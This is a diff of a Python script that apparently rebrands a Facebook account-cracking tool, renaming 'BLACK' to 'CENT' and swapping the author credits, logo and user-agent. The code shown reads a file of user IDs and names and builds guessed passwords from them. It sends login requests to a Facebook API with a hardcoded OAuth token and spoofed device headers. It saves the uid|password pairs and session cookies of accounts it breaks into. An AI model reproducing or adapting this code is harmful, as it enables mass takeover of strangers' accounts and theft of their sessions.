@@ -2,15 +2,23 @@ import os
 from os import path
 from pathlib import Path
 import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess
+
+W = '\033[97;1m'
+R = '\033[91;1m'
+G = '\033[92;1m'
+Y = '\033[93;1m'
+B = '\033[94;1m'
+P = '\033[95;1m'
+C = '\033[96;1m'
+
 try:
     import requests,os,json,time,re,random,sys,uuid,string
     from string import *
     from requests import api
     from concurrent.futures import ThreadPoolExecutor as tred
 except ImportError:
-	print('\n Installing missing modules ...')
-    os.system('pip install requests futures==2 > /dev/null')
     os.system('python BLACK.py')
+    
 
 #-----------------------------------##-----------------------------------#
 folder_path = '/sdcard/BLACK'
@@ -24,20 +32,20 @@ cps=[]
 loop=0
 #-----------------------------------##-----------------------------------#
 def morshed90():
-        ua = '[FBAN/FB4A;FBAV/419.0.0.67.59;FBBV/692042011;FBRV/0;FBPN/com.facebook.katana;FBLC/bn_IN;FBMF/iPhone 6s Plus;FBBD/iPhone 6s Plus;FBDV/iPhone 6s Plus;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
+        ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360166405 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0'
         return ua
 #-----------------------------------##-----------------------------------#
 logo=(f"""
-\x1b[1;92m d8888b. db       .d8b.   .o88b. db   dD 
-\x1b[1;92m 88  `8D 88      d8' `8b d8P  Y8 88 ,8P' 
-\x1b[1;97m 88oooY' 88      88ooo88 8P      88,8P   
-\x1b[1;97m 88~~~b. 88      88~~~88 8b      88`8b   
-\x1b[1;92m 88   8D 88booo. 88   88 Y8b  d8 88 `88. 
-\x1b[1;92m Y8888P' Y88888P YP   YP  `Y88P' YP   YD 
+\033[97;1m █████████  █████████  ███     ██  ███████████ 
+\033[97;1m ██         ██         ██ █    ██      ███    
+\033[97;1m ██         ████████   ██  █   ██      ███    
+\033[97;1m ██         ██         ██   █  ██      ███    
+\033[97;1m ██         ██         ██    █ ██      ███   
+\033[97;1m █████████  █████████  ██     ███      ███   
 \x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] AUTHOR   : MD MORSHED
- \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] FACEBOOK : MD MORSHED
- \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] GITHUB   : MORSHED-404         0.1
+ \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] AUTHOR   : CENT
+ \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] FACEBOOK : CenT
+ \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] GITHUB   : CenTsuPH         0.1
 \x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 #-----------------------------------##-----------------------------------#
 def line():
@@ -48,8 +56,8 @@ def clear():
 def Morshed():
         clear();print(" \x1b[1;92m[\x1b[1;97mA\x1b[1;92m] FILE CLONING");print(" \x1b[1;92m[\x1b[1;97mB\x1b[1;92m] JOIN GROUP ");print(" \x1b[1;92m[\x1b[1;97mC\x1b[1;92m] CONTACT ADMIN");print(" \x1b[1;92m[\x1b[1;97mX\x1b[1;92m] \033[1;31mEXIT");line();opt1 = input(" \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] CHOOSE : ")
         if opt1 in ['1','A','a','01']:SCST()
-        if opt1 in ['2','B','b','02']:os.system('xdg-open https://m.me/j/AbYSIjnx58Bm0qnS/');Main_BLACK()
-        if opt1 in ['3','c','C','03']:os.system('xdg-open https://www.facebook.com/profile.php?id=100079519400970');Main_BLACK()
+        #if opt1 in ['2','B','b','02']:os.system('xdg-open https://m.me/j/AbYSIjnx58Bm0qnS/');Main_BLACK()
+        #if opt1 in ['3','c','C','03']:os.system('xdg-open https://www.facebook.com/profile.php?id=100079519400970');Main_BLACK()
 def SCST():
     clear();print(" \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] FOR EXAMPLE: \033[1;32m/sdcard/black.txt");line()
     file = input(" \x1b[1;92m[\x1b[1;97m⩸\x1b[1;92m] PUT FILE PATH : ")
@@ -87,7 +95,7 @@ def SCST():
 def api0(ids,names,passlist):
     try:
         global ok,loop,sim_id
-        sys.stdout.write(f'\r\r\33[1;37m [\33[1;32mBLACK-XD\33[1;37m]-[\033[1;32m%s\033[1;37m]-\033[1;37m[\033[1;32mOK:%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\33[1;37m [\33[1;32mCENT-XD\33[1;37m]-[\033[1;32m%s\033[1;37m]-\033[1;37m[\033[1;32mOK:%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -107,7 +115,7 @@ def api0(ids,names,passlist):
             'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
             'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
             'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-Connection-Type':'WIFI',
+            'X-FB-Connection-Type':'MOBILE.LTE',
             'X-Tigon-Is-Retry':'False',
             'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
             'x-fb-device-group':'5120',
@@ -144,19 +152,19 @@ def api0(ids,names,passlist):
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                     sskk = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                     cookie = f"sb={sskk};{ckkk}"
-                    print('\r\r\033[1;37m [\033[1;32mBLACK-OK\033[1;37m]\033[1;32m '+uid+' | '+pas)
+                    print('\r\r\033[1;37m [\033[1;32mCENT-OK\033[1;37m]\033[1;32m '+uid+' | '+pas)
                     print(f"\033[1;37m [\033[1;32m•\033[1;37m]\033[1;32m {cookie}")
                     line()
-                    file_path = os.path.join(folder_path, 'BLACK-FILE-OK.txt')
-                    open('/sdcard/BLACK/BLACK-FILE-OK-COOKIE.txt','a').write(uid+' | '+pas+' | '+cookie+'\n')
+                    file_path = os.path.join(folder_path, 'CENT-FILE-OK.txt')
+                    open('/sdcard/CENT/CENT-FILE-OK-COOKIE.txt','a').write(uid+' | '+pas+' | '+cookie+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+' | '+pas+'\n')
                     oks.append(uid)
                     break
             elif 'www.facebook.com' in po['error']['message']:
                     uid = str(po['error']['error_data']['uid'])
-                    print(f'\r\r\33[1m\33[1;35m [BLACK-CP] '+uid+' | '+pas+'\033[1;97m')
-                    file_path = os.path.join(folder_path, 'BLACK-FILE-CP.txt')
+                    print(f'\r\r\33[1m\33[1;35m [CENT-CP] '+uid+' | '+pas+'\033[1;97m')
+                    file_path = os.path.join(folder_path, 'CENT-CP.txt')
                     with open(file_path, 'a') as file:
                         file.write(uid+' | '+pas+'\n')
                     cps.append(uid)
